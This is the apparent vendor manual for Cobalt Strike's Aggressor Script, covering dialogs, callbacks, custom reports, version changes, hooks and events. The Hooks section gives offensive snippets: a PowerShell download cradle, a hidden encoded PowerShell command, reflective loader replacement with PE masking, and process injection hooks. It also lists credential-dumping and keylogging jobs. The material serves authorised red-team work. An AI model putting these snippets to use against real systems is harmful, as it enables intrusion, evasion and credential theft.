Aggressor Script has an API to build custom dialogs. &dialog creates a dialog. A dialog consists of rows and buttons. A row is a label, a row name, a GUI component to take input, and possibly a helper to set the input. Buttons close the dialog and trigger a callback function. The argument to the callback function is a dictionary mapping each row's name to the value in its GUI component that takes input. Use &dialog_show to show a dialog, once it's built.

Here's a dialog that looks like Site Management -> Host File from Cobalt Strike:

sub callback {
   println("Dialog was actioned. Button: $2 Values: $3");
}
 
$dialog = dialog("Host File", %(uri => "/download/file.ext", port => 80, mimetype => "automatic"), &callback);
dialog_description($dialog, "Host a file through Cobalt Strike's web server");
 
drow_file($dialog, "file", "File:");
drow_text($dialog, "uri",  "Local URI:");
drow_text($dialog, "host", "Local Host:", 20);
drow_text($dialog, "port", "Local Port:");
drow_combobox($dialog, "mimetype", "Mime Type:", @("automatic", "application/octet-stream", 
                       "text/html", "text/plain")); 
 
dbutton_action($dialog, "Launch");
dbutton_help($dialog, "https://www.cobaltstrike.com/help-host-file");
 
dialog_show($dialog);
Let's walk through this example: The &dialog call creates the Host File dialog. The second parameter to &dialog is a dictionary that sets default values for the uri, port, and mimetype rows. The third parameter is a reference to a callback function. Aggressor Script will call this function when the user clicks the Launch button. &dialog_description places a description at the top of the dialog. This dialog has five rows. The first row, made by &drow_file, has the label "File:", the name "file", and it takes input as a text field. There is a helper button to choose a file and populate the text field. The others rows are conceptually similar. &dbutton_action and &dbutton_help create buttons that are centered at the bottom of the dialog. &dialog_show shows the dialog.

Here's the dialog:



figure 75 - A scripted dialog.


 
 Callbacks
A callback is used to allow the user to get access to the result and do additional processing on the information. Cobalt Strike and Aggressor Script uses the concept of callbacks because of the asynchronous behavior of sending a task to beacon and the response being received sometime in the future based on the current sleep time. They are also used when dealing with custom dialogs in order to perform additional actions based on information from the dialog input and action button.

Once your asynchronous callback is executed you can then perform the necessary operations to process the result for your use case. Here are some examples of what you can do with the result:

Format the result before displaying in the Beacon Console
Scan the result for information to trigger some additional task
Save the information to a file
A callback function will have arguments and in most cases will have the same arguments, however there are some exceptions. You should always refer to the aggressor script function documentation to understand what arguments are being passed to your callback.

Callback Request and Response Processing
The following describes at a high level what goes on when a callback is used in an aggressor script command.

The client executes an aggressor script command with a callback
A request is created and saved in a queue to be retrieved later
The request is sent to the teamserver
The teamserver receives the request
The request is saved in a queue to be retrieved later
The request is sent to a beacon
The Beacon receives the request and processes the task
A response is generated and sent to the teamserver
The teamserver receives the response
The request is retrieved from the teamserver queue using an id from the response
A reply is generated and sent to the originating client
The originating client receives the response
The request is retrieved from the client queue using an id from the response
The client will execute the callback
Both the client and teamserver save requests that have associated callbacks in a queue. A request is eventually removed in order to maintain the number of request in the queue. A request is removed when these two conditions occur.

The first condition is when the originating client disconnects from the teamserver. When this happens the queue managed by the client is removed as the queue is per teamserver connection. The queue on the teamserver will see the originating client has disconnected and flag any requests for that client to be removed. This means the originating client needs to stay connected to the teamserver until the command with a callback has completed. Otherwise, any responses from Beacon after a disconnection from the originating client will be lost.

The second condition is when there is no responses for a request after a period of time. There are two timeout settings that determine if a request should be removed. The first setting is the limits.callback_max_timeout which defaults to 1 day, which is used to wait for the initial response. The second setting is the limits.callback_keep_timeout which defaults to 1 hour, which is used to wait for subsequent responses. These settings can be modified by updating the TeamServer.prop file. In most use cases the defaults should be fine, however if you create a command that is a long-running job/task then these settings may need to be adjusted. The adjusted settings need to be based on how often data will be received, which needs to account for beacon's sleep time and how often the job/task sends data.

If you see error(s) like the following in the teamserver console window then this can indicate the settings need to be adjusted or the originating client has disconnected from the teamserver.

`"Callback #/# has no pending request"`

The TeamServer.prop file is not included in the Cobalt Strike distribution. The current default file can be found on Github (https://github.com/Cobalt-Strike/teamserver-prop).

Callback Implementation
Aggressor script callbacks can be implemented using a few different techniques and in many cases the technique used is based on personal preference. There are some use cases where you will want to choose a particular technique in order to accomplish the task. The following type of techniques can be used followed by simple snippets of code:

Anonymous Closure
Named Closure
Lambda Closure
Examples of aggressor script functions that support the use of a callback function can be found on Github (https://github.com/Cobalt-Strike/callback_examples).

Anonymous Closure Example
An anonymous closure is useful when you have a small amount of code that can be kept inline with the caller. In this example the closure is executed in the future when data is returned from a BOF, which simply logs the output to the beacon console.

alias cs_example {
   # User setup code removed for brevity
   beacon_inline_execute($bid, $data, "go", $args, { blog($1, $2); });
}
Named Closure Example
A named closure is useful when you have a lot of code and may want to reuse the code with other aggressor functions. In this example the closure named `bof_cb` is executed in the future when data is returned from a BOF.

# $1 - bid, $2 - result, $3 - info map
sub bof_cb {
   # User defined code removed for brevity
}
alias cs_example {
   local('$bid $data $args');
   # User setup code removed for brevity
   beacon_inline_execute($bid, $data, "go", $args, &bof_cb));
}
Lambda Closure Example
A lambda closure is useful when you want to pass variable(s) that would not be in scope using the previous methods. This example shows how you can get access to the $test_num variable which is in the scope of the cs_example alias.

# $1 - bid, $2 - result, $3 - info map, $4 - test_num
sub bof_cb {
   # User defined code removed for brevity
}
alias cs_example {
   local('$bid $file $test_num');
   # User setup code removed for brevity
   binline_execute($bid, $file, $test_num, lambda({ bof_cb
                  ($1, $2, $3, $test_num); }, \$test_num);
}







Custom Reports
Cobalt Strike uses a domain-specific language to define its reports. This language is similar to Aggressor Script but does not have access to most of its APIs. The report generation process happens in its own script engine isolated from your client.

The report script engine has access to a data aggregation API and a few primitives to specify the structure of a Cobalt Strike report.

The default.rpt file defines the default reports in Cobalt Strike.

Loading Reports
Go to Cobalt Strike -> Preferences -> Reports to load a custom report. Press the Folder icon and select a .rpt file. Press Save. You should now see your custom report under the Reporting menu in Cobalt Strike.



figure 76 - Load a report file here.

Report Errors
If Cobalt Strike had trouble with your report (e.g., a syntax error, runtime error, etc.) this will show up in the script console. Go to View -> Script Console to see these messages.

"Hello World" Report
Here's a simple "Hello World" report. This report doesn't represent anything special. It merely shows how to get started with a custom report.

# default description of our report [the user can change this].
describe("Hello Report", "This is a test report.");

# define the Hello Report
report "Hello Report" {
   # the first page is the cover page of our report.
   page "first" {
      # title heading
      h1($1['long']);
 
      # today's date/time in an italicized format
      ts();
 
      # a paragraph [could be the default...
      p($1['description']);
   }
 
   # this is the rest of the report
   page "rest" {
      # hello world paragraph
      p("Hello World!");
   }
}
Aggressor Script defines new reports with the report keyword followed by a report name and a block of code. Use the page keyword within a report block to define which page template to use. Content for a page template may span multiple pages. The first page template is the cover of Cobalt Strike's reports. This example uses &h1 to print a title heading. The &ts function prints a date/time stamp for the report. And the &p function prints a paragraph.

The &describe function sets a default description of the report. The user may edit this when they generate the report. This information is passed to the report as part of the report metadata in the $1 parameter. The $1 parameter is a dictionary with information about the user's preferences for the report.

Data Aggregation API
Cobalt Strike Reports depend on the Data Aggregation API to source their information. This API provides you a merged view of data from all team server's your client is currently connected to. The Data Aggregation API allows reports to provide a comprehensive report of the assessment activities. These functions begin with the ag prefix (e.g., &agTargets). The report engine passes a data aggregate model when it generates a report. This model is the $3 parameter.







Compatibility Guide
This page documents Cobalt Strike changes version-to-version that may affect compatability with your current Aggressor Scripts. In general, it's our goal that a script written for Cobalt Strike 3.0 is forward-compatible with future 3.x releases. Major product releases (e.g., 3.0 -> 4.0) do give us some license to revisit APIs and break some of this compatability. Sometimes, a compatability breaking API change is inevitable. These changes are documented here.

Cobalt Strike 4.x
Cobalt Strike 4.x made major changes to Cobalt Strike's listener management systems. These changes included name changes for several payloads. Scripts that analyze the listener payload name should note these changes:
windows/beacon_smb/bind_pipe is now windows/beacon_bind_pipe
windows/beacon_tcp/bind_tcp is now windows/beacon_bind_tcp
Cobalt Strike 4.x moves away from payload stagers. Stageless payloads are preferred in all post-ex workflows. Where stageless isn't possible; use an explicit stager that works with all payloads.

The jump psexec_psh lateral movement attack is a good example of the above. This automation generates a bind_pipe stager to fit within the size constraints of a PowerShell one-liner. All payloads are sent through this staging process; regardless of their configuration.

This convention change will break some privilege escalation scripts that follow the pre-4.x patterns in the Elevate Kit. &bstage is now gone as its underlying functionality was changed too much to include in Cobalt Strike 4.x. Where possible, privilege escalation scripts should use &payload to export a payload, run it via the technique, and use &beacon_link to connect to the payload. If a stager is required; use &stager_bind_tcp to export a TCP stager and &beacon_stage_tcp to stage a payload through this stager.

Cobalt Strike 4.x removes the following Aggressor Script functions:

 

Function Replacement Reason
&bbypassuac &belevate   &belevate is the preferred function to spawn an elevated session on the local system
&bpsexec_psh   &bjump   &bjump is the preferred function to spawn a session on a remote target
&brunasadmin   &belevate_command runasadmin was expanded to allow multiple options to run a command in an elevated context
&bstage  multiple functions   &bstage would stage AND link when needed. Bind staging is now explicit with &beacon_stage_tcp or &beacon_stage_pipe. &beacon_link is the general "link to this listener" step.
&bwdigest   &bmimikatz  Use &bmimikatz to run this command... if you really want to. :)
&bwinrm  &bjump, winrm or winrm64   &bjump is the preferred function to spawn a session on a remote target
&bwmi    No stageless WMI lateral movement option exists in CS 4.x
 

Cobalt Strike 4.x deprecates the following Aggressor Script functions:

 

Function Replacement Reason
&artifact   &artifact_stager  Consistent arguments; consistent naming convetion
&artifact_stageless  &artifact_payload Consistent naming; no need for a callback in Cobalt Strike 4.x
&drow_proxyserver    Proxy config is now tied to the listener and not needed when exporting a payload stage.
&drow_listener_smb   &drow_listener_stage These functions are now equivalent to eachother
&listener_create  &listener_create_ext A lot more options required a change in how arguments are passed
&powershell &powershell_command, &artifact_stager  Consistency; de-emphasis on PowerShell one-liners in API
&powershell_encode_oneliner   &powershell_command  Clearer naming.
&powershell_encode_stager  &powershell_command, &artifact_general Consistency; clearer separation of parts in API
&shellcode  &stager  Consistent arguments; consistent naming








Hooks
Hooks allow Aggressor Script to intercept and change Cobalt Strike behavior.

APPLET_SHELLCODE_FORMAT
Format shellcode before it's placed on the HTML page generated to serve the Signed or Smart Applet Attacks. See User-driven Web Drive-by Attacks.

Applet Kit
This hook is demonstrated in the Applet Kit. The Applet Kit is available via the Cobalt Strike Arsenal (Help -> Arsenal).

Example
set APPLET_SHELLCODE_FORMAT {
   return base64_encode($1);
}
BEACON_RDLL_GENERATE
Hook to allow users to replace the Cobalt Strike reflective loader in a beacon with a User Defined Reflective Loader. The reflective loader can be extracted from a compiled object file and plugged into the Beacon Payload DLL. See User Defined Reflective DLL Loader.

Arguments
$1 - Beacon payload file name

$2 - Beacon payload (dll binary)

$3 - Beacon architecture (x86/x64)

Returns
The Beacon executable payload updated with the User Defined reflective loader. Return $null to use the default Beacon executable payload.

Example
sub generate_my_dll {
   local('$handle $data $loader $temp_dll');

   # ---------------------------------------------------------------------
   # Load an Object File that contains a Reflective Loader.
   # The architecture ($3) is used in the path.
   # ---------------------------------------------------------------------
   # $handle = openf("/mystuff/Refloaders/bin/MyReflectiveLoader. $+ $3 $+ .o");
   $handle = openf("mystuff/Refloaders/bin/MyReflectiveLoader. $+ $3 $+ .o");

   $data   = readb($handle, -1);
   closef($handle);

   # warn("Object File Length: " . strlen($data));

   if (strlen($data) eq 0) {
      warn("Error loading reflective loader object file.");
      return $null;
   }

   # ---------------------------------------------------------------------
   # extract loader from BOF.
   # ---------------------------------------------------------------------
   $loader = extract_reflective_loader($data);

   # warn("Reflective Loader Length: " . strlen($loader));

   if (strlen($loader) eq 0) {
      warn("Error extracting reflective loader.");
      return $null;
   }

   # ---------------------------------------------------------------------
   # Replace the beacons default reflective loader with '$loader'.
   # ---------------------------------------------------------------------
   $temp_dll = setup_reflective_loader($2, $loader);

   # ---------------------------------------------------------------------
   # TODO: Additional Customization of the PE...
   # - Use 'pedump' function to get information for the updated DLL.
   # - Use these convenience functions to perform transformations on the DLL:
   #       pe_remove_rich_header
   #       pe_insert_rich_header
   #       pe_set_compile_time_with_long
   #       pe_set_compile_time_with_string
   #       pe_set_export_name
   #       pe_update_checksum
   # - Use these basic functions to perform transformations on the DLL:
   #       pe_mask
   #       pe_mask_section
   #       pe_mask_string
   #       pe_patch_code
   #       pe_set_string
   #       pe_set_stringz
   #       pe_set_long
   #       pe_set_short
   #       pe_set_value_at
   #       pe_stomp
   # ---------------------------------------------------------------------

   # ---------------------------------------------------------------------
   # Give back the updated beacon DLL.
   # ---------------------------------------------------------------------
   return $temp_dll;
}

# ------------------------------------
# $1 = DLL file name
# $2 = DLL content
# $3 = arch
# ------------------------------------
set BEACON_RDLL_GENERATE {
   warn("Running 'BEACON_RDLL_GENERATE' for DLL " . $1 . " with architecture " . $3);
   return generate_my_dll($1, $2, $3);
}
BEACON_RDLL_GENERATE_LOCAL
The BEACON_RDLL_GENERATE_LOCAL hook is very similar to BEACON_RDLL_GENERATE with additional arguments.

Arguments
$1 - Beacon payload file name

$2 - Beacon payload (dll binary)

$3 - Beacon architecture (x86/x64)

$4 - Parent beacon ID

$5 - GetModuleHandleA pointer

$6 - GetProcAddress pointer

Example
# ------------------------------------
# $1 = DLL file name
# $2 = DLL content
# $3 = arch
# $4 = parent Beacon ID
# $5 = GetModuleHandleA pointer
# $6 = GetProcAddress pointer
# ------------------------------------
set BEACON_RDLL_GENERATE_LOCAL {
   warn("Running 'BEACON_RDLL_GENERATE_LOCAL' for DLL " . 
   $1 ." with architecture " . $3 . " Beacon ID " . $4 . " GetModuleHandleA "
   $5 . " GetProcAddress " . $6);
   return generate_my_dll($1, $2, $3);
}   
Also See
BEACON_RDLL_GENERATE

BEACON_RDLL_SIZE
The BEACON_RDLL_SIZE hook allows the use of beacons with more space reserved for User Defined Reflective loaders. The alternate beacons are used in the BEACON_RDLL_GENERATE and BEACON_RDLL_GENERATE_LOCAL hooks. The original/default space reserved for reflective loaders is 5KB. The hook also allows the entire reflective loader space to be removed.

Overriding this setting will generate beacons that are too large for the placeholders in standard artifacts. It is very likely to require customized changes in an artifact kit to expand reserved payload space. See the documentation in the artifact kit provided by Cobalt Strike.

Customized "stagesize" settings are documented in "build.sh" and "script.example". See User Defined Reflective DLL Loader.

Arguments
$1 - Beacon payload file name

$2 - Beacon architecture (x86/x64)

Returns
The size in KB for the Reflective Loader reserved space in beacons. Valid values are "0", "5", "100".

"0" uses beacons without the reserved spaces for reflective loaders.

"5" is the default and uses standard beacons with 5KB reserved space for reflective loaders.

"100" uses larger beacons with 100KB reserved space for reflective loaders.

Example
# ------------------------------------
# $1 = DLL file name
# $2 = arch
# ------------------------------------
set BEACON_RDLL_SIZE {
   warn("Running 'BEACON_RDLL_SIZE' for DLL " . $1 . " with architecture " . $2);
   return "100";
}
BEACON_SLEEP_MASK
Update a Beacon payload with a User Defined Sleep Mask

Arguments
$1 - beacon type (default, pivot)

$2 - arch

Sleep Mask Kit
This hook is demonstrated in the The Sleep Mask Kit.

EXECUTABLE_ARTIFACT_GENERATOR
Control the EXE and DLL generation for Cobalt Strike.

Arguments
$1 - the artifact file (e.g., artifact32.exe)

$2 - shellcode to embed into an EXE or DLL

Artifact Kit
This hook is demonstrated in the The Artifact Kit.

HTMLAPP_EXE
Controls the content of the HTML Application User-driven (EXE Output) generated by Cobalt Strike.

Arguments
$1 - the EXE data

$2 - the name of the .exe

Resource Kit
This hook is demonstrated in the The Resource Kit.

Example
set HTMLAPP_EXE {
   local('$handle $data');
   $handle = openf(script_resource("template.exe.hta"));
   $data   = readb($handle, -1);
   osef($handle);

   $data   = strrep($data, '##EXE##', transform($1, "hex"));
   $data   = strrep($data, '##NAME##', $2);

   return $data;
}
HTMLAPP_POWERSHELL
Controls the content of the HTML Application User-driven (PowerShell Output) generated by Cobalt Strike.

Arguments
$1 - the PowerShell command to run

Resource Kit
This hook is demonstrated in the The Resource Kit.

Example
set HTMLAPP_POWERSHELL {
   local('$handle $data');
   $handle = openf(script_resource("template.psh.hta"));
   $data   = readb($handle, -1);
   closef($handle);
   
   # push our command into the script
   return strrep($data, "%%DATA%%", $1);
}
LISTENER_MAX_RETRY_STRATEGIES
Return a string that contains the list of definitions which is separated with a '\n' character. The definition needs to match a syntax of exit-[max_attempts]-[increase_attempts]-[duration][m,h,d].

For example exit-10-5-5m will exit beacon after 10 failed attempts and will increase sleep time after five failed attempts to 5 minutes. The sleep time will not be updated if the current sleep time is greater than the specified duration value. The sleep time will be affected by the current jitter value. On a successful connection the failed attempts count will be reset to zero and the sleep time will be reset to the prior value.

Return $null to use the default list.

Example
# Use a hard coded list of strategies
set LISTENER_MAX_RETRY_STRATEGIES {
   local('$out');
   $out .= "exit-50-25-5m\n";
   $out .= "exit-100-25-5m\n";
   $out .= "exit-50-25-15m\n";
   $out .= "exit-100-25-15m\n";
 
   return $out;
}  
 

# Use loops to build a list of strategies
set LISTENER_MAX_RETRY_STRATEGIES {
  local('$out');
 
  @attempts = @(50, 100);
  @durations = @("5m", "15m");
  $increase = 25;
 
  foreach $attempt (@attempts)
  {
    foreach $duration (@durations)
    {
      $out .= "exit $+ - $+ $attempt $+ - $+ $increase $+ - $+ $duration\n";
    }
  }
 
  return $out;
} 
 

POSTEX_RDLL_GENERATE
Hook to allow users to replace the Cobalt Strike reflective loader for post-ex with a User Defined Reflective Loader. See Post-ex User Defined Reflective DLL Loader.

The Post-ex DLL passed as argument 2 does not contain any reflective loader. You do not need to remove an existing reflective loader from the DLL.

Arguments
$1 – Post-ex payload file name

$2 – Post-ex payload (dll binary)

$3 – Post-ex architecture (x86/x64)

$4 – parent Beacon ID

$5 – GetModuleHandle pointer

$6 – GetProcAddress pointer

Returns
The Post-ex payload updated with the User Defined reflective loader. Return $null to use the default Post-ex payload and loader.

Example
# ------------------------------------
# $1 = DLL file name
# $2 = DLL content
# $3 = arch
# $4 = parent Beacon ID
# $5 = GetModuleHandle pointer
# $6 = GetProcAddress pointer
# ------------------------------------
set POSTEX_RDLL_GENERATE {
local('$arch $ postex $file_handle $ldr $loader_path $payload');
   $postex = $2;
   $arch = $3;
   warn("Running 'POSTEX_RDLL_GENERATE' for DLL " .
$1 ." with architecture " . $3 . " Beacon ID " . $4 . " .        GetModuleHandleA “ .
$5 . " GetProcAddress " . $6);

   # Read the UDRL from the supplied binary file
   $loader_path = "mystuff/Refloaders/bin/MyPostExReflectiveLoader. $+ $arch $+ .o";
   $file_handle = openf($loader_path);
   $ldr = readb($file_handle, -1);
   closef($file_handle);
   if (strlen($ldr) == 0) {
      warn("Error: Failed to read $loader_path");
      return $null;
      }

   # Prepend UDRL (sRDI/Double Pulsar type) to Post-ex DLL and output the modified payload.
   $payload = $ldr . $postex;
   print_info("Payload Size: " . strlen($payload));
   return $payload;
}
POWERSHELL_COMMAND
Change the form of the powershell comamnd run by Cobalt Strike's automation. This affects jump psexec_psh, powershell, and [host] -> Access -> One-liner.

Arguments
$1 - the PowerShell command to run.

$2 - true|false the command is run on a remote target.

Resource Kit
This hook is demonstrated in the The Resource Kit.

Example
set POWERSHELL_COMMAND {
   local('$script');
   $script = transform($1, "powershell-base64");
   
   # remote command (e.g., jump psexec_psh)
   if ($2) {
      return "powershell -nop -w hidden -encodedcommand $script";
   }
   # local command
   else {
      return "powershell -nop -exec bypass -EncodedCommand $script";
   }
}
POWERSHELL_COMPRESS
A hook used by the resource kit to compress a PowerShell script. The default uses gzip and returns a deflator script.

Resource Kit
This hook is demonstrated in the The Resource Kit.

Arguments
$1 - the script to compress

POWERSHELL_DOWNLOAD_CRADLE
Change the form of the PowerShell download cradle used in Cobalt Strike's post-ex automation. This includes jump winrm|winrm64, [host] -> Access -> One Liner, and powershell-import.

Arguments
$1 - the URL of the (localhost) resource to reach

Resource Kit
This hook is demonstrated in the The Resource Kit.

Example
set POWERSHELL_DOWNLOAD_CRADLE {
   return "IEX (New-Object Net.Webclient).DownloadString(' $+ $1 $+ ')";
}
PROCESS_INJECT_EXPLICIT
Hook to allow users to define how the explicit process injection technique is implemented when executing post exploitation commands using a Beacon Object File (BOF).

Arguments
$1- Beacon ID

$2- memory injectable dll (position-independent code)

$3- the PID to inject into

$4- offset to jump to

$5- x86/x64 - memory injectable DLL arch

Returns
Return a non empty value when defining your own explicit process injection technique.

Return $null to use the default explicit process injection technique.

Post Exploitation Jobs
The following post exploitation commands support the PROCESS_INJECT_EXPLICIT hook. The Command column displays the command to be used in the Beacon window, The Aggressor Script column displays the aggressor script function to be used in scripts, and the UI column displays which menu option to use.

Additional Information
The [Process Browser] interface is accessed by [beacon] -> Explore -> Process List. There is also a multi version of this interface which is accessed by selecting multiple sessions and using the same UI menu. When in the Process Browser use the buttons to perform additional commands on the selected process.
The chromedump, dcsync, hashdump, keylogger, logonpasswords, mimikatz, net, portscan, printscreen, pth, screenshot, screenwatch, ssh, and ssh-key commands also have a fork&run version. To use the explicit version requires the pid and architecture arguments.
For the net and &bnet command the ‘domain’ command will not use the hook.
Job Types
 

Command  Aggressor Script  UI
browserpivot   &bbrowserpivot [beacon] -> Explore -> Browser Pivot
chromedump      
dcsync   &bdcsync  
dllinject   &bdllinject  
hashdump &bhashdump   
inject   &binject [Process Browser] -> Inject
keylogger   &bkeylogger [Process Browser] -> Log Keystrokes
logonpasswords &blogonpasswords   
mimikatz &bmimikatz   
&bmimikatz_small   
net   &bnet  
portscan &bportscan   
printscreen &bprintscreen   
psinject &bpsinject   
pth   &bpassthehash   
screenshot  &bscreenshot   [Process Browser] -> Screenshot (Yes)
screenwatch &bscreenwatch  [Process Browser] -> Screenshot (No)
shinject &bshinject   
ssh   &bssh  
ssh-key  &bssh_key    
 

Example
# Hook to allow the user to define how the explicit injection technique
# is implemented when executing post exploitation commands.
# $1 = Beacon ID
# $2 = memory injectable dll for the post exploitation command
# $3 = the PID to inject into
# $4 = offset to jump to
# $5 = x86/x64 - memory injectable DLL arch
set PROCESS_INJECT_EXPLICIT {
   local('$barch $handle $data $args $entry');
 
   # Set the architecture for the beacon's session
   $barch = barch($1);
 
   # read in the injection BOF based on barch
   warn("read the BOF: inject_explicit. $+ $barch $+ .o");
   $handle = openf(script_resource("inject_explicit. $+ $barch $+ .o"));
   $data = readb($handle, -1);
   closef($handle);
 
   # pack our arguments needed for the BOF
   $args = bof_pack($1, "iib", $3, $4, $2);
 
   btask($1, "Process Inject using explicit injection into pid $3");
 
   # Set the entry point based on the dll's arch
   $entry = "go $+ $5";
   beacon_inline_execute($1, $data, $entry, $args);
 
   # Let the caller know the hook was implemented.
   return 1;
}
PROCESS_INJECT_SPAWN
Hook to allow users to define how the fork and run process injection technique is implemented when executing post exploitation commands using a Beacon Object File (BOF).

Arguments
$1 - Beacon ID

$2 - memory injectable dll (position-independent code)

$3 - true/false ignore process token

$4 - x86/x64 - memory injectable DLL arch

Returns
Return a non empty value when defining your own fork and run process injection technique.

Return $null to use the default fork and run injection technique.

Post Exploitation Jobs
The following post exploitation commands support the PROCESS_INJECT_SPAWN hook. The Command column displays the command to be used in the Beacon window, The Aggressor Script column displays the aggressor script function to be used in scripts, and the UI column displays which menu option to use.

Additional Information
The elevate, runasadmin, &belevate, &brunasadmin and [beacon] -> Access -> Elevate commands will only use the PROCESS_INJECT_SPAWN hook when the specified exploit uses one of the listed aggressor script functions in the table, for example &bpowerpick.
For the net and &bnet command the ‘domain’ command will not use the hook.
The ‘(use a hash)’ note means select a credential that references a hash.

Job Types
 

Command  Aggressor Script  UI
chromedump      
dcsync   &bdcsync  
elevate  &belevate   [beacon] -> Access -> Elevate
[beacon] -> Access -> Golden Ticket
hashdump &bhashdump  [beacon] -> Access -> Dump Hashes
keylogger   &bkeylogger  
logonpasswords &blogonpasswords  [beacon] -> Access -> Run Mimikatz
[beacon] -> Access -> Make Token (use a hash)
mimikatz &bmimikatz   
&bmimikatz_small   
net   &bnet [beacon] -> Explore -> Net View
portscan &bportscan  [beacon] -> Explore -> Port Scan
powerpick   &bpowerpick  
printscreen &bprintscreen   
pth   &bpassthehash   
runasadmin  &brunasadmin    
[target] -> Scan
screenshot  &bscreenshot   [beacon] -> Explore -> Screenshot
screenwatch &bscreenwatch   
ssh   &bssh [target] -> Jump -> ssh
ssh-key  &bssh_key   [target] -> Jump -> ssh-key
[target] -> Jump -> [exploit] (use a hash)
 

Example
# ------------------------------------
# $1 = Beacon ID
# $2 = memory injectable dll (position-independent code)
# $3 = true/false ignore process token
# $4 = x86/x64 - memory injectable DLL arch
# ------------------------------------
set PROCESS_INJECT_SPAWN {
   local('$barch $handle $data $args $entry');
 
   # Set the architecture for the beacon's session
   $barch = barch($1);
 
   # read in the injection BOF based on barch
   warn("read the BOF: inject_spawn. $+ $barch $+ .o");
   $handle = openf(script_resource("inject_spawn. $+ $barch $+ .o"));
   $data = readb($handle, -1);
   closef($handle);
 
   # pack our arguments needed for the BOF
   $args = bof_pack($1, "sb", $3, $2);
   btask($1, "Process Inject using fork and run");
 
   # Set the entry point based on the dll's arch
   $entry = "go $+ $4";
   beacon_inline_execute($1, $data, $entry, $args);
 
   # Let the caller know the hook was implemented.
   return 1;
}
PSEXEC_SERVICE
Set the service name used by jump psexec|psexec64|psexec_psh and psexec.

Example
set PSEXEC_SERVICE {
   return "foobar";
}
PYTHON_COMPRESS
Compress a Python script generated by Cobalt Strike.

Arguments
$1 - the script to compress

Resource Kit
This hook is demonstrated in the The Resource Kit.

Example
set PYTHON_COMPRESS {
   return "import base64; exec base64.b64decode(\"" . base64_encode($1) . "\")";
}
RESOURCE_GENERATOR
Control the format of the VBS template used in Cobalt Strike.

Resource Kit
This hook is demonstrated in the The Resource Kit.

Arguments
$1 - the shellcode to inject and run

RESOURCE_GENERATOR_VBS
Controls the content of the HTML Application User-driven (EXE Output) generated by Cobalt Strike.

Arguments
$1 - the EXE data

$2 - the name of the .exe

Resource Kit
This hook is demonstrated in the The Resource Kit.

Example
set HTMLAPP_EXE {
   local('$handle $data');
   $handle = openf(script_resource("template.exe.hta"));
   $data   = readb($handle, -1);
   closef($handle);

   $data   = strrep($data, '##EXE##', transform($1, "hex"));
   $data   = strrep($data, '##NAME##', $2);

   return $data;
}
SIGNED_APPLET_MAINCLASS
Specify a Java Applet file to use for the Java Signed Applet Attack. See Java Signed Applet Attack.

Applet Kit
This hook is demonstrated in the Applet Kit. The Applet Kit is available via the Cobalt Strike Arsenal (Help -> Arsenal).

Example
set SIGNED_APPLET_MAINCLASS {
   return "Java.class";
}
SIGNED_APPLET_RESOURCE
Specify a Java Applet file to use for the Java Signed Applet Attack. See Java Signed Applet Attack.

Applet Kit
This hook is demonstrated in the Applet Kit. The Applet Kit is available via the Cobalt Strike Arsenal (Help -> Arsenal).

Example
set SIGNED_APPLET_RESOURCE {
   return script_resource("dist/applet_signed.jar");
}
SMART_APPLET_MAINCLASS
Specify the MAIN class of the Java Smart Applet Attack. See Java Smart Applet Attack.

Applet Kit
This hook is demonstrated in the Applet Kit. The Applet Kit is available via the Cobalt Strike Arsenal (Help -> Arsenal).

Example
set SMART_APPLET_MAINCLASS {
   return "Java.class";
}
SMART_APPLET_RESOURCE
Specify a Java Applet file to use for the Java Smart Applet Attack. See Java Smart Applet Attack.

Applet Kit
This hook is demonstrated in the Applet Kit. The Applet Kit is available via the Cobalt Strike Arsenal (Help -> Arsenal).

Example
set SMART_APPLET_RESOURCE {
   return script_resource("dist/applet_rhino.jar");
}







Events
These are the events fired by Aggressor Script.

*
This event fires whenever any Aggressor Script event fires.

Arguments
$1 - the original event name

... - the arguments to the event

Example
# event spy script
on * {
   println("[ $+ $1 $+ ]: " . subarray(@_, 1));
}
beacon_checkin
Fired when a Beacon checkin acknowledgement is posted to a Beacon's console.

Arguments
$1 - the ID of the beacon

$2 - the text of the message

$3 - when this message occurred

beacon_error
Fired when an error is posted to a Beacon's console.

Arguments
$1 - the ID of the beacon

$2 - the text of the message

$3 - when this message occurred

beacon_indicator
Fired when an indicator of compromise notice is posted to a Beacon's console.

Arguments
$1 - the ID of the beacon

$2 - the user responsible for the input

$3 - the text of the message

$4 - when this message occurred

beacon_initial
Fired when a Beacon calls home for the first time.

Arguments
$1 - the ID of the beacon that called home.

Example
on beacon_initial {
   # list network connections
   bshell($1, "netstat -na | findstr \"ESTABLISHED\"");
 
   # list shares
   bshell($1, "net use");
 
   # list groups
   bshell($1, "whoami /groups");
}
beacon_initial_empty
Fired when a DNS Beacon calls home for the first time. At this point, no metadata has been exchanged.

Arguments
$1 - the ID of the beacon that called home.

Example
on beacon_initial_empty {
   binput($1, "[Acting on new DNS Beacon]");
 
   # change the data channel to DNS TXT
   bmode($1, "dns-txt");
 
   # request the Beacon checkin and send its metadata
   bcheckin($1);
}
beacon_input
Fired when an input message is posted to a Beacon's console.

Arguments
$1 - the ID of the beacon

$2 - the user responsible for the input

$3 - the text of the message

$4 - when this message occurred

beacon_mode
Fired when a mode change acknowledgement is posted to a Beacon's console.

Arguments
$1 - the ID of the beacon

$2 - the text of the message

$3 - when this message occurred

beacon_output
Fired when output is posted to a Beacon's console.

Arguments
$1 - the ID of the beacon

$2 - the text of the message

$3 - when this message occurred

beacon_output_alt
Fired when (alternate) output is posted to a Beacon's console. What makes for alternate output? It's just different presentation from normal output.

Arguments
$1 - the ID of the beacon

$2 - the text of the message

$3 - when this message occurred

beacon_output_jobs
Fired when jobs output is sent to a Beacon's console.

Arguments
$1 - the ID of the beacon

$2 - the text of the jobs output

$3 - when this message occurred

beacon_output_ls
Fired when ls output is sent to a Beacon's console.

Arguments
$1 - the ID of the beacon

$2 - the text of the ls output

$3 - when this message occurred

beacon_output_ps
Fired when ps output is sent to a Beacon's console.

Arguments
$1 - the ID of the beacon

$2 - the text of the ps output

$3 - when this message occurred

beacon_tasked
Fired when a task acknowledgement is posted to a Beacon's console.

Arguments
$1 - the ID of the beacon

$2 - the text of the message

$3 - when this message occurred

beacons
Fired when the team server sends over fresh information on all of our Beacons. This occurs about once each second.

Arguments
$1 - an array of dictionary objects with metadata for each Beacon.

custom_event_<event name>
Fired when a client receives a custom event from another client.

Arguments
$1 - who sent the custom event

$2 - the event data

$3 - the time the event was sent

Example
# subscribe to the my-topic custom event
on "custom_event_my-topic" {
   println("Received my-topic:")
   println("\tSender: $1");
   println("\tData: $2");
